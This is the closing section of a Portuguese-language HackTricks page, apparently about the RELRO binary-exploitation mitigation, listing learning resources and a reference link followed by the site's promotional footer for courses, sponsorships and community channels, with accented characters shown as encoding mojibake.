* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Refer√™ncias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
